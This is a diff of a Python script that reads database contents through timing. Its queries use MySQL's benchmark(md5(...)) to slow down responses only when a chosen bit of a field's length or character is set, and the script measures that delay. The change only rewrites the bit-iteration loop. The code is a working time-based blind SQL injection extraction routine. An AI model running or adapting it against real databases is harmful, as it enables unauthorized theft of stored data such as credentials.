@@ -13,7 +13,6 @@ cur = db.cursor()
 iters = 500000
 sensitivity = 100
 
-bits8 = [128,64,32,16,8,4,2,1]
 
 def measure(sql):
 	s_time = time.time();
@@ -26,7 +25,8 @@ def getlength(field,table,where):
 	accum = 0
 	mintime = measure("select curdate()")
 	
-	for bitpos in bits8:
+	for b in range(0,8):
+		bitpos = 1 << b
 		sql = "select if(length({0!s}) & {1:d},benchmark({2:d},md5('cc')),0) from {3!s} where {4!s};".format(field, bitpos, iters, table, where)
 		_time = measure(sql)
 
@@ -40,7 +40,8 @@ def getbits(pos,field,table,where):
 	accum = 0
 	mintime = measure("select curdate()")
 	
-	for bitpos in bits8:
+	for b in range(0,8):
+		bitpos = 1 << b
 		sql = "select if(ord(substring({0!s},{1:d},1)) & {2:d},benchmark({3:d},md5('cc')),0) from {4!s} where {5!s};".format(field, pos, bitpos, iters, table, where) 
 		_time = measure(sql)
 		
